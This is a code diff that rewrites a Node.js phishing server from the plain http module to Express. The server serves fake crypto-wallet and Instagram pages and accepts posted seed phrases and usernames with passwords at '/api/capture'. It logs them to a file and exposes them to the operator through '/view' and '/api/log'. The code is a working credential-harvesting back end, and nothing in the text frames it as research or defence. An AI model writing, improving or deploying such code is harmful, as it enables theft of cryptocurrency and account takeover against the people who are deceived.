@@ -1,119 +1,65 @@
-const http = require('http');
+const express = require('express');
 const fs = require('fs');
-const url = require('url');
+const path = require('path');
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-const PORT = 3000;
-let capturedPhrase = '';
-const LOG_FILE = './captured_phrases.log';
+app.use(express.json());
 
-const server = http.createServer((req, res) => {
-  const parsedUrl = url.parse(req.url, true);
-  const path = parsedUrl.pathname;
+// Serve static files from current directory
+app.use(express.static(path.join(__dirname)));
 
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+// Capture endpoint
+app.post('/api/capture', (req, res) => {
+    const data = req.body;
+    let entry;
 
-  if (req.method === 'OPTIONS') {
-    res.writeHead(204);
-    res.end();
-    return;
-  }
-
-  if (path === '/' || path === '/wallet.html') {
-    fs.readFile('./wallet.html', 'utf8', (err, data) => {
-      if (err) { res.writeHead(500); res.end('Server error'); return; }
-      res.writeHead(200, { 'Content-Type': 'text/html' });
-      res.end(data);
-    });
-    return;
-  }
-
-  if (path === '/view' || path === '/view.html') {
-    fs.readFile('./view.html', 'utf8', (err, data) => {
-      if (err) { res.writeHead(500); res.end('Server error'); return; }
-      res.writeHead(200, { 'Content-Type': 'text/html' });
-      res.end(data);
-    });
-    return;
-  }
-
-
-  // Add this alongside the other file-serving routes
-if (path === '/instagram.html') {
-  fs.readFile('./instagram.html', 'utf8', (err, data) => {
-    if (err) {
-      res.writeHead(404);
-      res.end('Instagram page not found');
-      return;
+    // Handle both formats:
+    // 1. { phrase: "seed words..." }
+    // 2. { phrase: JSON.stringify({username, password, ...}) }
+    if (data.phrase) {
+        // Try to parse if it's stringified JSON
+        try {
+            const parsed = JSON.parse(data.phrase);
+            entry = { ...parsed, timestamp: new Date().toISOString() };
+        } catch {
+            entry = { phrase: data.phrase, timestamp: new Date().toISOString() };
+        }
+    } else {
+        entry = { ...data, timestamp: new Date().toISOString() };
     }
-    res.writeHead(200, { 'Content-Type': 'text/html' });
-    res.end(data);
-  });
-  return;
-}
 
-  if (path === '/api/capture' && req.method === 'POST') {
-    let body = '';
-    req.on('data', chunk => { body += chunk; });
-    req.on('end', () => {
-      try {
-        const json = JSON.parse(body);
-        capturedPhrase = json.phrase || '';
-        
-        // ═══════════════════════════════════
-        // PERSISTENT LOGGING — Saves to file
-        // ═══════════════════════════════════
-        const timestamp = new Date().toISOString();
-        const logLine = `[${timestamp}] ${capturedPhrase}\n`;
-        fs.appendFileSync(LOG_FILE, logLine);
-        
-        console.log(`[CAPTURED] ${logLine.trim()}`);
-        
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: true }));
-      } catch (e) {
-        res.writeHead(400);
-        res.end(JSON.stringify({ error: 'Invalid JSON' }));
-      }
-    });
-    return;
-  }
+    const logLine = JSON.stringify(entry) + '\n';
+    fs.appendFileSync('captured_phrases.log', logLine);
 
-  if (path === '/api/capture' && req.method === 'GET') {
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ 
-      phrase: capturedPhrase, 
-      timestamp: new Date().toISOString() 
-    }));
-    return;
-  }
+    // Also keep latest in memory
+    global.latestCapture = entry;
 
-  if (path === '/api/log') {
-    // ═══ NEW: Serve the full log file to your view page ═══
-    try {
-      const logData = fs.readFileSync(LOG_FILE, 'utf8');
-      const entries = logData.split('\n').filter(line => line.length > 0).map(line => {
-        const match = line.match(/^\[(.*?)\] (.*)$/);
-        return match ? { timestamp: match[1], phrase: match[2] } : null;
-      }).filter(e => e !== null);
-      
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ entries }));
-    } catch (e) {
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ entries: [] }));
-    }
-    return;
-  }
-
-  res.writeHead(404);
-  res.end('Not found');
+    res.json({ status: 'ok' });
 });
 
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`Server running on http://0.0.0.0:${PORT}`);
-  console.log(`PA wallet page:  http://YOUR_SERVER_IP:${PORT}/wallet.html`);
-  console.log(`Your view page:  http://YOUR_SERVER_IP:${PORT}/view`);
-  console.log(`Log file: ${LOG_FILE}`);
+app.get('/api/capture', (req, res) => {
+    res.json(global.latestCapture || { phrase: 'No captures yet' });
+});
+
+app.get('/api/log', (req, res) => {
+    try {
+        const data = fs.readFileSync('captured_phrases.log', 'utf8');
+        const entries = data.trim().split('\n').filter(l => l).map(l => JSON.parse(l));
+        res.json({ entries });
+    } catch {
+        res.json({ entries: [] });
+    }
+});
+
+app.get('/view', (req, res) => {
+    res.sendFile(path.join(__dirname, 'view.html'));
+});
+
+app.get('/instagram', (req, res) => {
+    res.sendFile(path.join(__dirname, 'instagram.html'));
+});
+
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
 });
